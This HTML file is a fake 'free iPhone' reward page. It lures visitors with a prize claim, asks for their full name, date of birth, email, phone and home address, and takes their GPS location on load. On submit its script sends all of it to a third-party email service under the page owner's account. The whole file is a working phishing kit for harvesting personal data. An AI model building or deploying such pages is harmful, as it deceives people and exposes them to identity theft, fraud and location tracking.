<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>iPhone Reward Form</title>
  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-image: url('https://via.placeholder.com/1920x1080');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }
    .container {
      max-width: 600px;
      background: rgba(255, 255, 255, 0.85);
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      text-align: center;
    }
    .form-heading {
      color: #333;
      font-size: 1.5rem;
      margin-bottom: 20px;
    }
    .btn-primary {
      background-color: #007bff;
      border: none;
      margin-top: 15px;
    }
    .btn-primary:hover {
      background-color: #0056b3;
    }
    .form-text {
      font-size: 0.9rem;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="form-heading">Congratulations! ðŸŽ‰</h1>
    <p class="lead">You've been selected to receive a brand-new iPhone!</p>
    <p class="form-text">Please fill out the form below to claim your reward.</p>

    <form id="rewardForm">
      <div class="form-group">
        <label for="fullName">Full Name</label>
        <input type="text" class="form-control" id="fullName" required />
      </div>
      <div class="form-group">
        <label for="dob">Date of Birth</label>
        <input type="date" class="form-control" id="dob" required />
      </div>
      <div class="form-group">
        <label for="email">Email Address</label>
        <input type="email" class="form-control" id="email" required />
      </div>
      <div class="form-group">
        <label for="phoneNumber">Phone Number</label>
        <input type="tel" class="form-control" id="phoneNumber" required />
      </div>
      <div class="form-group">
        <label for="address">Shipping Address</label>
        <textarea class="form-control" id="address" rows="3" required></textarea>
      </div>
      <div class="form-group">
        <label for="city">City</label>
        <input type="text" class="form-control" id="city" required />
      </div>
      <div class="form-group">
        <label for="postalCode">Postal Code</label>
        <input type="text" class="form-control" id="postalCode" required />
      </div>

      <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
      <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
    </form>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("_fZgZZhnhhK2OvuV"); // Public Key
    })();
  </script>

  <script>
    let userLocation = "Not Available";

    // Get Geolocation on load
    document.addEventListener("DOMContentLoaded", function () {
      const locationDisplay = document.getElementById("locationDisplay");

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          function (position) {
            userLocation = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
            locationDisplay.textContent = userLocation;
          },
          function (error) {
            userLocation = "Unable to access location: " + error.message;
            locationDisplay.textContent = userLocation;
          }
        );
      } else {
        userLocation = "Geolocation not supported";
        locationDisplay.textContent = userLocation;
      }

      // Form submission
      document.getElementById("rewardForm").addEventListener("submit", function (e) {
        e.preventDefault();

        const templateParams = {
          full_name: document.getElementById("fullName").value,
          dob: document.getElementById("dob").value,
          email: document.getElementById("email").value,
          phone: document.getElementById("phoneNumber").value,
          address: document.getElementById("address").value,
          city: document.getElementById("city").value,
          postal_code: document.getElementById("postalCode").value,
          location: userLocation
        };

        emailjs.send("service_7xiz4x8", "template_xxxxxx", templateParams)
          .then(function(response) {
            alert("Form submitted successfully! ðŸŽ‰");
            console.log("SUCCESS!", response.status, response.text);
          }, function(error) {
            alert("Failed to send email: " + error.text);
            console.log("FAILED...", error);
          });
      });
    });
  </script>
</body>
</html>
